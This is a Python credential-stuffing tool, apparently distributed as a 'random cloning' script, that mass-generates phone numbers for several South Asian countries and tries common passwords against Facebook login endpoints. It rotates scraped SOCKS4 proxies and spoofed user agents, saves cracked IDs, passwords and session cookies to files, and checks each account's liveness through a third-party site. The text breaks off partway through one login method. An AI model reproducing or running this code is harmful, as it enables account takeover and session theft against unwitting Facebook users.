#───────────➤ IMPORT ➤───────────#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as SxMxd
from datetime import datetime
#───────────➤ PROXY ➤───────────#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
#───────────➤ USER-AGENT ➤───────────#
def ___ua___():
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	chrome_version=f"{str(random.randint(40,113))}.0.{str(random.randint(3000,5999))}.{str(random.randint(10,299))}"
	build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
	numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	samsung=random.choice(["RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","RMX2180"])
	ua1=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	ua2=f"Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randrange(80,120))}.0.{str(random.randint(4200,5700))}.{str(random.randrange(40,150))} Mobile Safari/537.36"
	ua3=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36'
	ua4=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	return random.choice([ua1,ua2,ua3,ua4])
#───────────➤ LOOP ➤───────────#
id,memek,loop,ok,cp=[],[],0,0,0
#───────────➤ COLOUR ➤───────────#
w='\x1b[1;97m';g='\x1b[38;5;48m';b='\x1b[38;5;8m';y="\033[1;33m";p="\33[1;34m"
#───────────➤ STYLE ➤───────────#
xd=f"{g}➤{w}";xd1=f"{g}➤{w}1{w}";xd2=f"{g}➤{w}2{w}";xd3=f"{g}➤{w}3{w}";xd4=f"{g}➤{w}4{w}";xd5=f"{g}➤{w}5{w}";xd0=f"{g}➤{w}0{w}";xdxx=f"{g}➤{w}?{w}"
#───────────➤ LINEX ➤───────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{p}──────────────────────────────────────────────────')
#───────────➤ LOGO ➤───────────#
logo=(f"""
           
  #####  #     # #     #    ####### ####### 
 #     #  #   #  ##   ##    #    #  #       
 #         # #   # # # #        #   #       
  #####     #    #  #  #       #    ######  
       #   # #   #     #      #           # 
 #     #  #   #  #     #      #     #     # 
  #####  #     # #     #      #      #####  
                                            

{p}──────────────────────────────────────────────────
{xd} OWNER {xd} Sumon X Mahid
{xd} TOOLS {xd} RANDOM ALL COUNTRY
{p}──────────────────────────────────────────────────""")
#───────────➤ MENU ➤───────────#
def ________menu________():
    clear();print(f'{xd1} RANDOM CLONING ');print(f'{xd0} EXIT CLONING ');linex();option=input(f"{xdxx} SELECT {xd} ")
    if option in ['1','A']:______randmx_____()
    else:exit()
#───────────➤ MENU ➤───────────#
def ______randmx_____():
    clear();print(f'{xd1} RANDOM {g}●{w}BD{g}●{w} CLONING ');print(f'{xd2} RANDOM {g}●{w}INDIA{g}●{w} CLONING ');print(f'{xd3} RANDOM {g}●{w}NEPAL{g}●{w} CLONING ');print(f'{xd4} RANDOM {g}●{w}PAKISTAN{g}●{w} CLONING ');print(f'{xd0} EXIT CLONING ');linex();option=input(f"{xdxx} SELECT {xd} ")
    if option in ['1']:______bdx_____()
    if option in ['2']:______indiax_____()
    if option in ['3']:______nepalx_____()
    if option in ['4']:______pakistanx_____()
    else:exit()
#───────────➤ RANDOM BD ➤───────────#
user=[]
def ______bdx_____():
	clear();print(f"{xd} EXAMPLE {xd} 01317 {g}●{w} 01728 {g}●{w} 01610 {g}●{w} 01834 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");print(f"{xd3} METHOD {g}●{w}R3{g}●{w}");print(f"{xd4} METHOD {g}●{w}R4{g}●{w}");print(f"{xd5} METHOD {g}●{w}R5{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
	with SxMxd(max_workers=30) as SxMxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [uid,love,uid[:7],uid[:6],uid[:8]]
			if methd in ["1"]:SxMxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:SxMxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:SxMxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:SxMxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:SxMxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM INDIA ➤───────────#
user=[]
def ______indiax_____():
	clear();print(f"{xd} EXAMPLE {xd} +91639 {g}●{w} +91827 {g}●{w} +98752 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");print(f"{xd3} METHOD {g}●{w}R3{g}●{w}");print(f"{xd4} METHOD {g}●{w}R4{g}●{w}");print(f"{xd5} METHOD {g}●{w}R5{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with SxMxd(max_workers=30) as SxMxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid[:8],'57273200','59039200','57575751']
			if methd in ["1"]:SxMxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:SxMxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:SxMxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:SxMxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:SxMxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM NEPAL ➤───────────#
user=[]
def ______nepalx_____():
	clear();print(f"{xd} EXAMPLE {xd} 9815 {g}●{w} 9814 {g}●{w} 9861 {g}●{w} 9840 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");print(f"{xd3} METHOD {g}●{w}R3{g}●{w}");print(f"{xd4} METHOD {g}●{w}R4{g}●{w}");print(f"{xd5} METHOD {g}●{w}R5{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
	with SxMxd(max_workers=30) as SxMxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [uid,love,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			if methd in ["1"]:SxMxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:SxMxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:SxMxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:SxMxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:SxMxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM PAKISTAN ➤───────────#
user=[]
def ______pakistanx_____():
	clear();print(f"{xd} EXAMPLE {xd} 0306 {g}●{w} 0335 {g}●{w} 0315 {g}●{w} 0345 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");print(f"{xd3} METHOD {g}●{w}R3{g}●{w}");print(f"{xd4} METHOD {g}●{w}R4{g}●{w}");print(f"{xd5} METHOD {g}●{w}R5{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with SxMxd(max_workers=30) as SxMxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
			if methd in ["1"]:SxMxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:SxMxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:SxMxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:SxMxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:SxMxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM AFGHANISTAN ➤───────────#
user=[]
def ______pakistanx_____():
	clear();print(f"{xd} EXAMPLE {xd} +9340 {g}●{w} +9360 {g}●{w} +9330 {g}●{w} +9350 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");print(f"{xd3} METHOD {g}●{w}R3{g}●{w}");print(f"{xd4} METHOD {g}●{w}R4{g}●{w}");print(f"{xd5} METHOD {g}●{w}R5{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with SxMxd(max_workers=30) as SxMxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			if methd in ["1"]:SxMxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:SxMxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:SxMxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:SxMxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:SxMxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM METHOD HOST R1 ➤───────────#
def ______R1______(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f'\r\r{xd} SxM•XD {loop} {ok}|{cp} ');sys.stdout.flush()
	ewe = requests.Session()
	ua = ___ua___()
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {'http': 'socks4://'+random.choice(xx)}
			link = ewe.get("https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
			"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
			"try_number": 0,
			"unrecognized_tries": 0,
			"email": uid,
			"prefill_contact_point": uid,
			"prefill_source": "browser_dropdown",
			"prefill_type": "contact_point",
			"first_prefill_source": "browser_dropdown",
			"first_prefill_type": "contact_point",
			"had_cp_prefilled": True,
			"had_password_prefilled": False,
			"is_smart_lock": False,
			"bi_xrwh": 0,
			"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
			"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
			"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			headers = {"Host": "p.facebook.com",
			"content-length": str(len((data))),
			"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"x-response-format": "JSONStream",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"viewport-width": "360",
			"x-requested-with": "XMLHttpRequest",
			"x-asbd-id": "129477",
			"dpr": "2",
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://p.facebook.com",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,headers = headers,allow_redirects = False,proxies = zz)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r\r{xd}{y} SxM-CP {ids} {w}●{y} {pw} ")
				cp+=1
				open('/sdcard/SxM-R1-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', kuki)[0]
				bal_remove = str(requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}').text)
				if 'live' in bal_remove:
					print(f"\r\r{xd}{g} SxM-OK {ids} {w}●{g} {pw} ")
					#print(f"\r\r{xd}{g} BISCUITS {xd} {kuki}")
					#print(f'{p}──────────────────────────────────────────────────')
					ok+=1
					open('/sdcard/SxM-R1-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+kuki+'\n')
				else:break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#───────────➤ RANDOM METHOD HOST R2 ➤───────────#
def ______R2______(uid,pwx):
    global loop,ok,cp
    sys.stdout.write(f'\r\r{xd} SxM•XD {loop} {ok}|{cp} ');sys.stdout.flush()
    try:
       for pw in pwx:
           url = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr"
           ___ua___ = ___ua___()
           nip=random.choice(prox)
           proxs= {'http': 'socks4://'+nip}
           with requests.Session() as ses:
              ses.headers.update({'Host': 'mbasic.facebook.com','Connection': 'keep-alive','Cache-Control': 'max-age=0','dpr': '2.8375000953674316','viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','Upgrade-Insecure-Requests': '1','User-Agent': ___ua___,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','dnt': '1','X-Requested-With': 'com.facebook.katana','Sec-Fetch-Site': 'none','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Referer': 'https://m.facebook.com/','Accept-Language': 'en-GB,en;q=0.9,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',})
              link = ses.get(url)
              koki =  (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
              koki+= "m_pixel_ratio=2.8375000953674316; ps_n=0; ps_l=0;locale=bn_IN; wl_cbv=v2%3Bclient_version%3A2448%3Btimestamp%3A1711417561; vpd=v1%3B461x381x2.8375000953674316; wd=381x712;"
              data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
              'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 
              'try_number': '0', 
              'unrecognized_tries': '0', 
              'email': uid, 
              'prefill_contact_point': '', 
              'prefill_source': '', 
              'prefill_type': '', 
              'first_prefill_source': '', 
              'first_prefill_type': '', 
              'had_cp_prefilled': 'false', 
              'had_password_prefilled': 'false', 
              'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 
              'pass':pw, 
              'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 
              'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), 
              '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
              head = {'Host': 'mbasic.facebook.com',
              'Connection': 'keep-alive',
              'Content-Length': str(len(data)),
              'Cache-Control': 'max-age=0',
              'dpr': '2.8375000953674316',
              'viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android',
              'sec-ch-ua-mobile': '?1',
              'sec-ch-ua-platform': 'Android',
              'sec-ch-prefers-color-scheme': 'light',
              'Upgrade-Insecure-Requests': '1',
              'Origin': 'https://mbasic.facebook.com',
              'Content-Type': 'application/x-www-form-urlencoded','User-Agent': ___ua___,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'X-Requested-With': 'com.facebook.katana',
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-User': '?1',
              'Sec-Fetch-Dest': 'document',
              'Referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr','Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',}
           po = ses.post(f'https://mbasic.facebook.com/login/device-based/regular/login/?api_key=490105264797912&auth_token=c1f860ebff6dcbf204cf9afed7a79328&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&refsrc=deprecated&app_id=490105264797912&cancel=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&lwv=100&locale2=en_BD&refid=9',headers=head,data=data,cookies={'cookie': koki},proxies=proxs,allow_redirects=False)
           if "checkpoint" in po.cookies.get_dict().keys():
               ids = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
               print(f"\r\r{xd}{y} SxM-CP {ids} {w}●{y} {pw} ")
               cp+=1
               open('/sdcard/SxM-R2-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
               break
           elif "c_user" in ses.cookies.get_dict().keys():
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', cookie)[0]
                xz = requests.get(f"https://graph.facebook.com/"+ids+"/picture?type=normal").text
                if 'Photoshop' in xz:
                    print(f"\r\r{xd}{g} SxM-OK {ids} {w}●{g} {pw} ")
                    #print(f"\r\r{xd}{g} BISCUITS {xd} {cookie}")
                    #print(f'{p}──────────────────────────────────────────────────')
                    ok+=1
                    open('/sdcard/SxM-R2-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+cookie+'\n')
                    break
                else:break
           else:
              continue
       loop+=1
    except Exception as e:
       pass
#───────────➤ RANDOM METHOD HOST R3 ➤───────────#
def ______R3______(uid,pwx):
    global loop,ok,cp
    try:
        for pw in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\r{xd} SxM•XD {loop} {ok}|{cp} ');sys.stdout.flush()
            nip=random.choice(prox)
            bro={"http":"socks4://"+nip}
            ua = ___ua___()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":pw,
            "login":"Log In"}
            header_freefb = {"Host":"m.facebook.com",
            "method":"POST",
            "path":"/login/device-based/regular/login/?login_attempt=1&lwv=100",
            "scheme":"https",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding":"gzip, deflate, br, zstd",
            "Accept-Language":"en,bn;q=0.9,en-US;q=0.8",
            "Cache-Control":"max-age=0",
            "Content-Length":"736",
            "Content-Type":"application/x-www-form-urlencoded",
            "Dpr":"1",
            "Origin":"https://m.facebook.com",
            "Referer":"https://m.facebook.com/login/",
            "Sec-Ch-Prefers-Color-Scheme":"light",
            "Sec-Ch-Ua":'"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Full-Version-List":'"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.131", "Google Chrome";v="120.0.6099.131"',
            "Sec-Ch-Ua-Mobile":'?0',
            "Sec-Ch-Ua-Model":"",
            "Sec-Ch-Ua-Platform":'"Windows"',
            "Sec-Ch-Ua-Platform-Version":"10.0.0",
            "Sec-Fetch-Dest":'document',
            "Sec-Fetch-Mode":'navigate',
            "Sec-Fetch-Site":'same-origin',
